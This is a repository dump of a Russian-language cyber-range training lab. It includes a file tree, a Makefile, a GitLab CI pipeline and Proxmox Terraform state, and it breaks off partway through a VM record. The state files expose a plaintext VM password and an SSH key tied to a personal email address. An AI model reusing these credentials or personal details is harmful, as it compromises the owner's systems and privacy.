@@ -1,0 +1,5675 @@
+Project Structure:
+./terraform.tfstate
+./.DS_Store
+./Makefile
+./.gitignore
+./infrastructure-outputs.json
+./.gitlab-ci.yml
+terraform/.DS_Store
+terraform/proxmox/terraform.tfstate.backup
+terraform/proxmox/outputs.tf
+terraform/proxmox/terraform.tfstate
+terraform/proxmox/main.tf
+terraform/proxmox/terraform.tfvars
+terraform/proxmox/plan.out
+terraform/proxmox/variables.tf
+terraform/proxmox/terraform.tfvars.example
+terraform/proxmox/.terraform.lock.hcl
+terraform/proxmox/.terraform/providers/registry.terraform.io/telmate/proxmox/3.0.2-rc04/darwin_arm64/LICENSE
+terraform/proxmox/.terraform/providers/registry.terraform.io/telmate/proxmox/3.0.2-rc04/darwin_arm64/README.md
+terraform/proxmox/.terraform/providers/registry.terraform.io/telmate/proxmox/3.0.2-rc04/darwin_arm64/terraform-provider-proxmox_v3.0.2-rc04
+terraform/kubernetes/outputs.tf
+terraform/kubernetes/main.tf
+terraform/kubernetes/variables.tf
+terraform/modules/network/outputs.tf
+terraform/modules/network/main.tf
+terraform/modules/network/variables.tf
+terraform/modules/vm/outputs.tf
+terraform/modules/vm/main.tf
+terraform/modules/vm/variables.tf
+docker/.DS_Store
+docker/images/vulnerable-web/requirements.txt
+docker/images/vulnerable-web/Dockerfile
+docker/images/vulnerable-web/app.py
+docker/images/attack-tools/Dockerfile
+docker/images/attack-tools/tools.sh
+docker/images/monitoring-agent/Dockerfile
+docker/images/monitoring-agent/agent.py
+docker/compose/docker-compose.yml
+docker/compose/docker-compose.prod.yml
+docs/SETUP.md
+docs/README.md
+docs/LAB_SCENARIOS.md
+ansible/.DS_Store
+ansible/ansible.cfg
+ansible/roles/pfsense/vars/main.yml
+ansible/roles/pfsense/tasks/main.yml
+ansible/roles/pfsense/templates/config.xml.j2
+ansible/roles/monitoring/vars/main.yml
+ansible/roles/monitoring/tasks/main.yml
+ansible/roles/monitoring/templates/prometheus.yml.j2
+ansible/roles/monitoring/templates/grafana.yml.j2
+ansible/roles/kubernetes/vars/main.yml
+ansible/roles/kubernetes/tasks/main.yml
+ansible/roles/kubernetes/templates/kubeadm-config.yml.j2
+ansible/playbooks/proxmox.yml
+ansible/playbooks/site.yml
+ansible/playbooks/pfsense.yml
+ansible/playbooks/kubernetes.yml
+ansible/inventories/production/hosts.yml
+scripts/.DS_Store
+scripts/management/restore.sh
+scripts/management/backup.sh
+scripts/management/cleanup.sh
+scripts/deployment/deploy.sh
+scripts/deployment/create-student-env.sh
+scripts/deployment/setup-cluster.sh
+.git/.DS_Store
+.git/ORIG_HEAD
+.git/config
+.git/HEAD
+.git/description
+.git/index
+.git/COMMIT_EDITMSG
+.git/FETCH_HEAD
+.git/objects/0d/ba0cceb69f9d1a94e74ac8e4981b443c6a3e98
+.git/objects/95/998ef0f12f890723d196294a07c788812c9756
+.git/objects/59/2908911f6905ef76080ffab64cbfcd779e65b5
+.git/objects/59/251c1400b47323d298f64e18e6fe016ed63a23
+.git/objects/66/90af4113ca56c693d3cbeeabfc756c46054906
+.git/objects/66/a217ec921921fa5d547a45cec7253aa87ed4e4
+.git/objects/9e/6147d3abc64f52bc026550886da15e8cd95528
+.git/objects/9e/75e77e9320340d20ea87a6da1d0d8510469030
+.git/objects/04/b3aa9f36ee50eb40bd95d745396e1f44944e28
+.git/objects/6a/68372f55f9ca4331932e19bbfafab4f320cde5
+.git/objects/3d/c8581461b5d252e5d4b532d579889ff6c3c2ea
+.git/objects/3d/cf222e68919750489fb0684c6a8c31790cba14
+.git/objects/67/1215c9fc269aec3607ff0388eb99cb701a1584
+.git/objects/0b/e625660adc0624ec0054c2a9bdccbfccb69330
+.git/objects/93/d813c32d3d7043d0a2d1326744a1f3b797566b
+.git/objects/0e/1959552e5efd221c0c0b2435b329758375c869
+.git/objects/60/adeda1c29d755672f509693291799493dce277
+.git/objects/05/cc0943c2ea3c013a5221b54a40210d395a926e
+.git/objects/9d/291bab1e6a0c6145bb09ae2eaf9bcbb0b4435b
+.git/objects/9c/4ecd96aa2a2e245e5b81ff4cd0275ca7a3da40
+.git/objects/a3/573504d1469c48418efc8d3e68ade7245b875d
+.git/objects/b5/ee0cdfe90d2541a3a3d81694841a740a5cb63e
+.git/objects/b5/c98892503ad5ba96fe2393781ab480e63f3d04
+.git/objects/d9/280692173e2c0d3c77f5e40ce0cfd6b69fcece
+.git/objects/bb/56515f7aa628ddf44467a031a0c625f1129c3a
+.git/objects/d7/9668e2278041802323949669806842cca3160e
+.git/objects/b4/80e9e5089c1d66c6d043879043810ba65c7f0c
+.git/objects/a2/bbfa2b055628df93d3f28c975489e427f00612
+.git/objects/bd/2dd2810f6e368205b51ca6ca8d7728718f3a7f
+.git/objects/d1/7760cee3fea4507eea0dddebe13499cf18f493
+.git/objects/e5/ecfc22128dc8769bdab42d61ab2afe7df3453e
+.git/objects/e2/912c84926bb638bd031db066ea366f78a99588
+.git/objects/f4/c494c1aca8a82a86a4216010839fc9bbb7f18c
+.git/objects/f3/783ffd67c8ffd2d55b5e0e6f7ed5ca23802aaf
+.git/objects/c7/98e615ba3a72cf46207fdd1ad2c6c0cfa06a3d
+.git/objects/fd/b472a9126ef80121b6857df089757ff84ae293
+.git/objects/f2/1663ea6ee55ff1ee76ae13642d597ff5934049
+.git/objects/e3/29ff1f76acf9e286260f853f09b5e81edc25cf
+.git/objects/c8/122d6985fd90c284beed975ae8d3ab336de091
+.git/objects/fb/3772e54a68c559c48e8bb80fba2caa82235bb1
+.git/objects/c1/ad2108dbe58726db4c02d5f6c3d02d08970b48
+.git/objects/c1/142a41baea3cdbdf9e88b3b677235cca6ee6b6
+.git/objects/c6/7ff754173cbe212552e889da671c03e67bb3d9
+.git/objects/4e/3cb2f9bfa5ebe8766b83a2bd18e08d13ce7b1c
+.git/objects/4b/51f2c6413619d699b8f88834df350b2584512b
+.git/objects/4b/dedf3300527f3f1fd2c2efa32ec4f5f325e6d7
+.git/objects/29/a43887e75cdef50e3a79878d5f2e7ced121bbe
+.git/objects/42/e4972684193734d507d244654eb33ffc7ed877
+.git/objects/1f/c4e004339083978ea21acf40c209603c8a82e0
+.git/objects/28/897344c5640264af81d94c212af9ff4466e9df
+.git/objects/17/67f8700ca09bc5a2fedb379fd7e167d6df5e67
+.git/objects/7b/3f183b44d460930482898283c5bbc13f94efb6
+.git/objects/7b/71b9f548beaa2344416bbde7086d8c8a5f1b20
+.git/objects/7e/3ddfc24066a27014cb103b87ea10fd0039f022
+.git/objects/10/d25ed309aafd88dd2e7eda6fd357d1f58a62d8
+.git/objects/19/bbd5708aedc416bc174468a954df85b0abcf6e
+.git/objects/26/43b34b0b77e34c1b5b96c31eacfe67704967fb
+.git/objects/75/77a1cf1186163f2945d10194ed3a852d14c820
+.git/objects/81/269e41758a4f86a3af3b8dda36fe252a396d54
+.git/objects/81/cff7a0b8b1d556e97df16999d96c3001aa9ae9
+.git/objects/72/1cc79f863f6096dab67bd19a4fef44e4e41a99
+.git/objects/43/57c45588ab027e3eabab72aa716a31cce8aabe
+.git/objects/88/05cc777b3543dd607bb68b9d62c57ea8b5fe2b
+.git/objects/6b/30727495f98affbd326a658a223e58c8e4f481
+.git/objects/38/a947289124772889891f260f4c8f0dda234040
+.git/objects/09/e4f449b806c9dd51acccee8264fcce786b17ff
+.git/objects/09/67ef424bce6791893e9a57bb952f80fd536e93
+.git/objects/31/5ddf0262eda430fcf10ba89f479b2e8a0a628c
+.git/objects/31/abfcb86c852cf4fe96e02f2b85eb73a3c3d03a
+.git/objects/91/dc1f90dcc1c3c66ff7ee0963bd3d880288f3c7
+.git/objects/62/7bb8161a21bdc551e07a408dc68aa3a67e4fe0
+.git/objects/62/95aceed4eaf204846cebaae7d3e89d08a050cd
+.git/objects/96/f2fd95d8b31ef40f7a947a59317d4876893cb6
+.git/objects/53/598137d52788f14f90b20506da27b2e61a8945
+.git/objects/53/207320b7b12e890a1be433ae7f4fb485791ea6
+.git/objects/30/4128d55a8f1af04b5bc495776c914c833eef84
+.git/objects/5b/827fb23fa24628c19b6c032bca076ae96aa114
+.git/objects/37/45eddc5004d1d3b7325b1b590f962d8008bd6a
+.git/objects/37/f6d0cfa13ddb09f974ca58317fce5df0daf2c3
+.git/objects/6d/93f8bb33e105fb3156e73a8eb09cad60f04b2f
+.git/objects/39/7fea328d2ed88ec9f965ed92e2c1d96fd589b9
+.git/objects/97/ad67963160c106ec92edd4e1e8e4e39f248f17
+.git/objects/97/602a57ea10b6c73a3704f166fba9586434b320
+.git/objects/64/08da82c73e353416cede77a94a30b86f4034e6
+.git/objects/64/9da6f03cd63ad4a5e1d101d12197d532bfd091
+.git/objects/90/7e7b7cbd44b0544f5b16a5b0bad59025e4f1c4
+.git/objects/90/5c164e383a53c5938b78bbc6e64093bfaa953a
+.git/objects/d3/4c8595a8b98c3a406978399134f25c93be906d
+.git/objects/d3/24e03ec771472ad9c90a3b35ac489107618124
+.git/objects/d4/e41c2e1cca503e4f491374abb43d37ab3633bb
+.git/objects/a7/af5d3046d346e065af625e9033c5bf7d3f05d3
+.git/objects/b1/27b9312b735442710ad9339688f34cbae939f6
+.git/objects/a9/9a56f1feb06c77486457c561226e54b04fde0c
+.git/objects/aa/def460b213f0fb60843c727a35e163cda4bd55
+.git/objects/b7/b226e18e1b8b53b198b1c901266f7ed7761c10
+.git/objects/de/e8a4b2742ee1b924ab8788a38051efaeda81ed
+.git/objects/a6/939233df2757b33d5f88688c7fb537758f304f
+.git/objects/b9/a8b83c7a95fb63284840e9ac6430b75887f720
+.git/objects/b9/c4d14a314b8876e5c0e9226aff09def490422b
+.git/objects/c3/6fa0a21b9acdf82fd2a707e463768c46148bd4
+.git/objects/ea/44433c780b19ad80d51d81f4b2c5db9e8a049e
+.git/objects/cc/a6753c508c47de4e79685a749613327b0b9a8d
+.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
+.git/objects/f9/0b05aee70312d5713746c768bd70ccdff759f5
+.git/objects/e9/00748db978143fa69759bd6a2f90da38651d17
+.git/objects/cb/775873c08a396e2d376f18cd6bc997a672e046
+.git/objects/1b/f607db6fb510bcf2da35898d98c724168c849a
+.git/objects/70/296581092be5029d002cb6d6e1782b43f6d5e5
+.git/objects/84/0e8467ba610204c125aabf9c8c35ed69b1cd35
+.git/objects/23/6823e3601bf15662721fb3c63a94f27b5e59ed
+.git/objects/82/355aefcda19ec7503d4bfa701abc0c74073cd7
+.git/objects/49/a32aeba668b1ced0424735a5017e0cd4c4b9e7
+.git/objects/2e/547d960fb1c9257241e76d5366480233efa4d2
+.git/objects/2b/1320fbdfcbde814c2f8c952ecb2a47a8cd55ff
+.git/objects/7f/0c964e11d77c4cae2319488035630d4495295a
+.git/objects/7a/291d35b2c3bd9ceb56019b8ad8fe0941fc02a9
+.git/objects/22/15f6b273b72044cc5fd8affe657a247fde04ef
+.git/objects/22/7c897eb560ad244e3d574450951566cfc9400f
+.git/objects/22/18f7a2bf9010cee69f0f687b608833f0759d5a
+.git/objects/25/62c7fd65ebca07f7ba134a9f67b4f179bb8bb6
+.git/info/exclude
+.git/logs/HEAD
+.git/logs/refs/heads/main
+.git/logs/refs/remotes/origin/main
+.git/hooks/commit-msg.sample
+.git/hooks/pre-rebase.sample
+.git/hooks/pre-commit.sample
+.git/hooks/applypatch-msg.sample
+.git/hooks/fsmonitor-watchman.sample
+.git/hooks/pre-receive.sample
+.git/hooks/prepare-commit-msg.sample
+.git/hooks/post-update.sample
+.git/hooks/pre-merge-commit.sample
+.git/hooks/pre-applypatch.sample
+.git/hooks/pre-push.sample
+.git/hooks/update.sample
+.git/hooks/push-to-checkout.sample
+.git/refs/heads/main
+.git/refs/remotes/origin/main
+kubernetes/.DS_Store
+kubernetes/manifests/namespaces/instructors.yml
+kubernetes/manifests/namespaces/monitoring.yml
+kubernetes/manifests/namespaces/students.yml
+kubernetes/manifests/network-policies/student-isolation.yml
+kubernetes/manifests/network-policies/isolation.yml
+kubernetes/manifests/applications/vulnerable-app.yml
+kubernetes/manifests/applications/web-server.yml
+kubernetes/manifests/monitoring/grafana.yml
+kubernetes/manifests/monitoring/prometheus.yml
+kubernetes/helm/cyber-range/charts/Chart.yaml
+kubernetes/helm/cyber-range/charts/values.yaml
+kubernetes/helm/cyber-range/templates/deployment.yaml
+kubernetes/helm/cyber-range/templates/ingress.yaml
+kubernetes/helm/cyber-range/templates/service.yaml
+
+File Contents:
+terraform.tfstate:
+```
+{
+  "version": 4,
+  "terraform_version": "1.13.3",
+  "serial": 1,
+  "lineage": "eb4acdf5-667c-84bf-5b3f-ba82d3400cb1",
+  "outputs": {},
+  "resources": [],
+  "check_results": null
+}
+
+```
+
+.DS_Store:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x80 in position 3131: invalid start byte
+```
+
+Makefile:
+```
+# Makefile для управления киберполигоном
+
+.PHONY: help install deploy destroy status logs clean student-env
+
+# Переменные
+TERRAFORM_DIR = terraform/proxmox
+ANSIBLE_DIR = ansible
+STUDENT_ID ?= 001
+LAB_TYPE ?= web-security
+
+help: ## Показать эту справку
+	@echo 'Доступные команды:'
+	@awk 'BEGIN {FS = ":.*?## "} /^[a-zA-Z_-]+:.*?## / {printf "  \033[36m%-15s\033[0m %s\n", $$1, $$2}' $(MAKEFILE_LIST)
+
+install: ## Установить зависимости
+	@echo "Установка зависимостей..."
+	@scripts/deployment/setup-dependencies.sh
+
+validate: ## Валидация конфигурации
+	@echo "Валидация Terraform..."
+	@cd $(TERRAFORM_DIR) && terraform fmt -check && terraform validate
+	@echo "Валидация Ansible..."
+	@cd $(ANSIBLE_DIR) && ansible-playbook --syntax-check playbooks/*.yml
+
+deploy: ## Полное развертывание
+	@echo "Запуск полного развертывания..."
+	@scripts/deployment/deploy.sh full
+
+deploy-infra: ## Развертывание только инфраструктуры
+	@echo "Развертывание инфраструктуры..."
+	@scripts/deployment/deploy.sh infra
+
+deploy-apps: ## Развертывание только приложений
+	@echo "Развертывание приложений..."
+	@scripts/deployment/deploy.sh apps
+
+destroy: ## Уничтожение инфраструктуры
+	@echo "ВНИМАНИЕ: Это удалит всю инфраструктуру!"
+	@read -p "Вы уверены? [y/N] " confirm && [ "$$confirm" = "y" ]
+	@cd $(TERRAFORM_DIR) && terraform destroy
+
+status: ## Показать статус
+	@echo "Статус Kubernetes кластера:"
+	@kubectl get nodes
+	@echo "\nСтатус подов:"
+	@kubectl get pods --all-namespaces
+	@echo "\nСтатус сервисов:"
+	@kubectl get services --all-namespaces
+
+logs: ## Показать логи
+	@echo "Логи системных подов:"
+	@kubectl logs -n kube-system -l k8s-app=kube-dns --tail=50
+
+student-env: ## Создать окружение для студента
+	@echo "Создание окружения для студента $(STUDENT_ID), тип: $(LAB_TYPE)"
+	@scripts/deployment/create-student-env.sh create $(STUDENT_ID) $(LAB_TYPE)
+
+student-cleanup: ## Удалить окружение студента
+	@echo "Удаление окружения студента $(STUDENT_ID)"
+	@scripts/deployment/create-student-env.sh cleanup $(STUDENT_ID)
+
+backup: ## Создать резервную копию
+	@echo "Создание резервной копии..."
+	@scripts/management/backup.sh
+
+restore: ## Восстановить из резервной копии
+	@echo "Восстановление из резервной копии..."
+	@scripts/management/restore.sh
+
+clean: ## Очистка временных файлов
+	@echo "Очистка временных файлов..."
+	@find . -name "*.tfstate*" -type f -delete
+	@find . -name ".terraform" -type d -exec rm -rf {} + 2>/dev/null || true
+	@find . -name "*.retry" -type f -delete
+	@docker system prune -f
+
+monitor: ## Открыть мониторинг
+	@echo "Получение URL мониторинга..."
+	@kubectl get service -n monitoring prometheus-grafana
+	@echo "Для доступа к Grafana выполните: kubectl port-forward -n monitoring svc/prometheus-grafana 3000:80"
+
+dev: ## Запуск в режиме разработки
+	@echo "Запуск в режиме разработки..."
+	@docker-compose -f docker/compose/docker-compose.yml up -d
+
+dev-stop: ## Остановка режима разработки
+	@echo "Остановка режима разработки..."
+	@docker-compose -f docker/compose/docker-compose.yml down
+```
+
+.gitignore:
+```
+# Логи и временные файлы
+*.log
+*.tmp
+*.swp
+
+# Артефакты сборки и кэш
+*.out
+*.pyc
+*.o
+*.so
+*.exe
+.cache/
+tmp/
+dist/
+build/
+
+# Секреты и токены
+.env
+.env.*
+*.key
+*.pem
+.terraform/
+
+# Терраформ переменные и state-файлы
+terraform.tfstate
+terraform.tfstate.*
+crash.log
+*.tfvars
+*.tfvars.json
+.terraform.lock.hcl
+
+# IDE/редактор
+.idea/
+.vscode/
+*.code-workspace
+
+# Mac OS
+.DS_Store
+
+# Bash-скрипты и временные shell-файлы
+*.bak
+*.sh~
+
+# Docker, если используется
+docker-compose.override.yml
+
+# Системные каталоги
+node_modules/
+__pycache__/
+
+```
+
+infrastructure-outputs.json:
+```
+{}
+
+```
+
+.gitlab-ci.yml:
+```
+stages:
+  - validate
+  - build
+  - test
+  - deploy-dev
+  - deploy-staging
+  - deploy-production
+
+variables:
+  DOCKER_REGISTRY: "registry.gitlab.com"
+  PROJECT_PATH: "$CI_PROJECT_PATH"
+  TF_VERSION: "1.5.7"
+  ANSIBLE_VERSION: "8.5.0"
+
+# Terraform validation
+terraform-validate:
+  stage: validate
+  image: hashicorp/terraform:$TF_VERSION
+  before_script:
+    - cd terraform/proxmox
+  script:
+    - terraform fmt -check
+    - terraform init -backend=false
+    - terraform validate
+  only:
+    changes:
+      - terraform/**/*
+
+# Ansible validation
+ansible-validate:
+  stage: validate
+  image: quay.io/ansible/ansible-runner:latest
+  script:
+    - cd ansible
+    - ansible-playbook --syntax-check playbooks/*.yml
+    - ansible-lint playbooks/
+  only:
+    changes:
+      - ansible/**/*
+
+# Build Docker images
+build-vulnerable-app:
+  stage: build
+  image: docker:latest
+  services:
+    - docker:dind
+  variables:
+    DOCKER_DRIVER: overlay2
+    DOCKER_TLS_CERTDIR: "/certs"
+  before_script:
+    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
+  script:
+    - cd docker/images/vulnerable-web
+    - docker build -t $CI_REGISTRY_IMAGE/vulnerable-web:$CI_COMMIT_SHA .
+    - docker push $CI_REGISTRY_IMAGE/vulnerable-web:$CI_COMMIT_SHA
+    - docker tag $CI_REGISTRY_IMAGE/vulnerable-web:$CI_COMMIT_SHA $CI_REGISTRY_IMAGE/vulnerable-web:latest
+    - docker push $CI_REGISTRY_IMAGE/vulnerable-web:latest
+  only:
+    changes:
+      - docker/images/vulnerable-web/**/*
+
+build-attack-tools:
+  stage: build
+  image: docker:latest
+  services:
+    - docker:dind
+  variables:
+    DOCKER_DRIVER: overlay2
+    DOCKER_TLS_CERTDIR: "/certs"
+  before_script:
+    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
+  script:
+    - cd docker/images/attack-tools
+    - docker build -t $CI_REGISTRY_IMAGE/attack-tools:$CI_COMMIT_SHA .
+    - docker push $CI_REGISTRY_IMAGE/attack-tools:$CI_COMMIT_SHA
+    - docker tag $CI_REGISTRY_IMAGE/attack-tools:$CI_COMMIT_SHA $CI_REGISTRY_IMAGE/attack-tools:latest
+    - docker push $CI_REGISTRY_IMAGE/attack-tools:latest
+  only:
+    changes:
+      - docker/images/attack-tools/**/*
+
+# Security testing
+security-scan:
+  stage: test
+  image: securecodewarrior/docker-security-scanner
+  script:
+    - docker run --rm -v /var/run/docker.sock:/var/run/docker.sock 
+        aquasecurity/trivy image $CI_REGISTRY_IMAGE/vulnerable-web:$CI_COMMIT_SHA
+  allow_failure: true
+
+# Deploy to Development
+deploy-dev:
+  stage: deploy-dev
+  image: 
+    name: hashicorp/terraform:$TF_VERSION
+    entrypoint: ['']
+  before_script:
+    - apk add --no-cache ansible
+    - cd terraform/proxmox
+  script:
+    - terraform init
+    - terraform plan -var-file="dev.tfvars" -out=dev.plan
+    - terraform apply -auto-approve dev.plan
+    - cd ../../ansible
+    - ansible-playbook -i inventories/dev playbooks/site.yml
+  environment:
+    name: development
+    url: http://dev.cyber-range.local
+  only:
+    - develop
+
+# Deploy to Staging
+deploy-staging:
+  stage: deploy-staging
+  image: 
+    name: hashicorp/terraform:$TF_VERSION
+    entrypoint: ['']
+  before_script:
+    - apk add --no-cache ansible
+    - cd terraform/proxmox
+  script:
+    - terraform init
+    - terraform plan -var-file="staging.tfvars" -out=staging.plan
+    - terraform apply -auto-approve staging.plan
+    - cd ../../ansible
+    - ansible-playbook -i inventories/staging playbooks/site.yml
+  environment:
+    name: staging
+    url: http://staging.cyber-range.local
+  only:
+    - main
+  when: manual
+
+# Deploy to Production
+deploy-production:
+  stage: deploy-production
+  image: 
+    name: hashicorp/terraform:$TF_VERSION
+    entrypoint: ['']
+  before_script:
+    - apk add --no-cache ansible
+    - cd terraform/proxmox
+  script:
+    - terraform init
+    - terraform plan -var-file="production.tfvars" -out=prod.plan
+    - terraform apply -auto-approve prod.plan
+    - cd ../../ansible
+    - ansible-playbook -i inventories/production playbooks/site.yml
+  environment:
+    name: production
+    url: http://cyber-range.local
+  only:
+    - tags
+  when: manual
+
+# Cleanup old deployments
+cleanup:
+  stage: deploy-production
+  image: hashicorp/terraform:$TF_VERSION
+  script:
+    - cd terraform/proxmox
+    - terraform init
+    - terraform destroy -auto-approve -var-file="old.tfvars"
+  when: manual
+  only:
+    - main
+```
+
+.DS_Store:
+```
+Error reading file: 'utf-8' codec can't decode bytes in position 603-604: invalid continuation byte
+```
+
+terraform.tfstate.backup:
+```
+{
+  "version": 4,
+  "terraform_version": "1.5.7",
+  "serial": 351,
+  "lineage": "37d48fea-c68d-f928-cbb0-dc1e73811f3e",
+  "outputs": {},
+  "resources": [],
+  "check_results": null
+}
+
+```
+
+outputs.tf:
+```
+
+```
+
+terraform.tfstate:
+```
+{
+  "version": 4,
+  "terraform_version": "1.5.7",
+  "serial": 356,
+  "lineage": "37d48fea-c68d-f928-cbb0-dc1e73811f3e",
+  "outputs": {},
+  "resources": [
+    {
+      "mode": "managed",
+      "type": "proxmox_vm_qemu",
+      "name": "k8s_master",
+      "provider": "provider[\"registry.terraform.io/telmate/proxmox\"]",
+      "instances": [
+        {
+          "index_key": 0,
+          "schema_version": 0,
+          "attributes": {
+            "additional_wait": 5,
+            "agent": 1,
+            "agent_timeout": 90,
+            "args": "",
+            "automatic_reboot": true,
+            "balloon": 0,
+            "bios": "seabios",
+            "boot": "order=scsi0;ide2",
+            "bootdisk": "",
+            "ci_wait": null,
+            "cicustom": null,
+            "cipassword": "UbuntuPass2025",
+            "ciupgrade": false,
+            "ciuser": "ubuntu",
+            "clone": "ubuntu-2004-template",
+            "clone_id": null,
+            "clone_wait": 10,
+            "cores": 0,
+            "cpu": [
+              {
+                "affinity": "",
+                "cores": 2,
+                "flags": [],
+                "limit": 0,
+                "numa": false,
+                "sockets": 1,
+                "type": "host",
+                "units": 0,
+                "vcores": 0
+              }
+            ],
+            "cpu_type": "",
+            "current_node": "proxmox70551",
+            "default_ipv4_address": "192.168.10.10",
+            "default_ipv6_address": "",
+            "define_connection_info": true,
+            "desc": null,
+            "description": "Managed by Terraform.",
+            "disk": [
+              {
+                "asyncio": "",
+                "backup": true,
+                "cache": "",
+                "discard": false,
+                "disk_file": "",
+                "emulatessd": false,
+                "format": "",
+                "id": 0,
+                "iops_r_burst": 0,
+                "iops_r_burst_length": 0,
+                "iops_r_concurrent": 0,
+                "iops_wr_burst": 0,
+                "iops_wr_burst_length": 0,
+                "iops_wr_concurrent": 0,
+                "iothread": false,
+                "iso": "",
+                "linked_disk_id": 0,
+                "mbps_r_burst": 0,
+                "mbps_r_concurrent": 0,
+                "mbps_wr_burst": 0,
+                "mbps_wr_concurrent": 0,
+                "passthrough": false,
+                "readonly": false,
+                "replicate": false,
+                "serial": "",
+                "size": "",
+                "slot": "ide2",
+                "storage": "local",
+                "type": "cloudinit",
+                "wwn": ""
+              },
+              {
+                "asyncio": "",
+                "backup": true,
+                "cache": "",
+                "discard": false,
+                "disk_file": "",
+                "emulatessd": false,
+                "format": "raw",
+                "id": 0,
+                "iops_r_burst": 0,
+                "iops_r_burst_length": 0,
+                "iops_r_concurrent": 0,
+                "iops_wr_burst": 0,
+                "iops_wr_burst_length": 0,
+                "iops_wr_concurrent": 0,
+                "iothread": false,
+                "iso": "",
+                "linked_disk_id": -1,
+                "mbps_r_burst": 0,
+                "mbps_r_concurrent": 0,
+                "mbps_wr_burst": 0,
+                "mbps_wr_concurrent": 0,
+                "passthrough": false,
+                "readonly": false,
+                "replicate": false,
+                "serial": "",
+                "size": "20G",
+                "slot": "scsi0",
+                "storage": "local",
+                "type": "disk",
+                "wwn": ""
+              }
+            ],
+            "disks": [],
+            "efidisk": [],
+            "force_create": false,
+            "force_recreate_on_change_of": null,
+            "full_clone": true,
+            "hagroup": "",
+            "hastate": "",
+            "hostpci": [],
+            "hotplug": "network,disk,usb",
+            "id": "proxmox70551/qemu/101",
+            "ipconfig0": "ip=192.168.10.10/24,gw=192.168.10.1",
+            "ipconfig1": null,
+            "ipconfig10": null,
+            "ipconfig11": null,
+            "ipconfig12": null,
+            "ipconfig13": null,
+            "ipconfig14": null,
+            "ipconfig15": null,
+            "ipconfig2": null,
+            "ipconfig3": null,
+            "ipconfig4": null,
+            "ipconfig5": null,
+            "ipconfig6": null,
+            "ipconfig7": null,
+            "ipconfig8": null,
+            "ipconfig9": null,
+            "kvm": true,
+            "linked_vmid": 0,
+            "machine": "",
+            "memory": 2048,
+            "name": "k8s-master-1",
+            "nameserver": null,
+            "network": [
+              {
+                "bridge": "vmbr1",
+                "firewall": false,
+                "id": 0,
+                "link_down": false,
+                "macaddr": "bc:24:11:96:09:be",
+                "model": "virtio",
+                "mtu": 0,
+                "queues": 0,
+                "rate": 0,
+                "tag": 0
+              }
+            ],
+            "numa": false,
+            "onboot": false,
+            "os_network_config": null,
+            "os_type": "cloud-init",
+            "pci": [],
+            "pcis": [],
+            "pool": "",
+            "protection": false,
+            "pxe": null,
+            "qemu_os": "other",
+            "reboot_required": false,
+            "rng": [],
+            "scsihw": "virtio-scsi-pci",
+            "searchdomain": null,
+            "serial": [
+              {
+                "id": 0,
+                "type": "socket"
+              }
+            ],
+            "skip_ipv4": false,
+            "skip_ipv6": false,
+            "smbios": [
+              {
+                "family": "",
+                "manufacturer": "",
+                "product": "",
+                "serial": "",
+                "sku": "",
+                "uuid": "adc36409-6eb8-4a5d-a0f0-0c8271efc4d9",
+                "version": ""
+              }
+            ],
+            "sockets": 0,
+            "ssh_forward_ip": null,
+            "ssh_host": "192.168.10.10",
+            "ssh_port": "22",
+            "ssh_private_key": null,
+            "ssh_user": null,
+            "sshkeys": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN574XK1yUf6MzqHMVgU4u+JdFj7HlE0Mnk6KIruBCm7 prokopenko.danilka121@gmail.com\n",
+            "startup": "",
+            "tablet": true,
+            "tags": " ",
+            "target_node": "proxmox70551",
+            "target_nodes": null,
+            "timeouts": null,
+            "tpm_state": [],
+            "unused_disk": [],
+            "usb": [],
+            "usbs": [],
+            "vcpus": 0,
+            "vga": [],
+            "vm_state": "running",
+            "vmid": 101
+          },
+          "sensitive_attributes": [
+            [
+              {
+                "type": "get_attr",
+                "value": "cipassword"
+              }
+            ]
+          ],
+          "private": "eyJlMmJmYjczMC1lY2FhLTExZTYtOGY4OC0zNDM2M2JjN2M0YzAiOnsiY3JlYXRlIjoxMjAwMDAwMDAwMDAwLCJkZWZhdWx0IjoxMjAwMDAwMDAwMDAwLCJkZWxldGUiOjEyMDAwMDAwMDAwMDAsInJlYWQiOjEyMDAwMDAwMDAwMDAsInVwZGF0ZSI6MTIwMDAwMDAwMDAwMH19"
+        }
+      ]
+    },
+    {
+      "mode": "managed",
+      "type": "proxmox_vm_qemu",
+      "name": "k8s_worker",
+      "provider": "provider[\"registry.terraform.io/telmate/proxmox\"]",
+      "instances": [
+        {
+          "index_key": 0,
+          "schema_version": 0,
+          "attributes": {
+            "additional_wait": 5,
+            "agent": 1,
+            "agent_timeout": 90,
+            "args": "",
+            "automatic_reboot": true,
+            "balloon": 0,
+            "bios": "seabios",
+            "boot": "order=scsi0;ide2",
+            "bootdisk": "",
+            "ci_wait": null,
+            "cicustom": null,
+            "cipassword": "UbuntuPass2025",
+            "ciupgrade": false,
+            "ciuser": "ubuntu",
+            "clone": "ubuntu-2004-template",
+            "clone_id": null,
+            "clone_wait": 10,
+            "cores": 0,
+            "cpu": [
+              {
+                "affinity": "",
+                "cores": 2,
+                "flags": [],
+                "limit": 0,
+                "numa": false,
+                "sockets": 1,
+                "type": "host",
+                "units": 0,
+                "vcores": 0
+              }
+            ],
+            "cpu_type": "",
+            "current_node": "proxmox70551",
+            "default_ipv4_address": "192.168.10.20",
+            "default_ipv6_address": "",
+            "define_connection_info": true,
+            "desc": null,
+            "description": "Managed by Terraform.",
+            "disk": [
+              {
+                "asyncio": "",
+                "backup": true,
+                "cache": "",
+                "discard": false,
+                "disk_file": "",
+                "emulatessd": false,
+                "format": "",
+                "id": 0,
+                "iops_r_burst": 0,
+                "iops_r_burst_length": 0,
+                "iops_r_concurrent": 0,
+                "iops_wr_burst": 0,
+                "iops_wr_burst_length": 0,
+                "iops_wr_concurrent": 0,
+                "iothread": false,
+                "iso": "",
+                "linked_disk_id": 0,
+                "mbps_r_burst": 0,
+                "mbps_r_concurrent": 0,
+                "mbps_wr_burst": 0,
+                "mbps_wr_concurrent": 0,
+                "passthrough": false,
+                "readonly": false,
+                "replicate": false,
+                "serial": "",
+                "size": "",
+                "slot": "ide2",
+                "storage": "local",
+                "type": "cloudinit",
+                "wwn": ""
+              },
+              {
+                "asyncio": "",
+                "backup": true,
+                "cache": "",
+                "discard": false,
+                "disk_file": "",
+                "emulatessd": false,
+                "format": "raw",
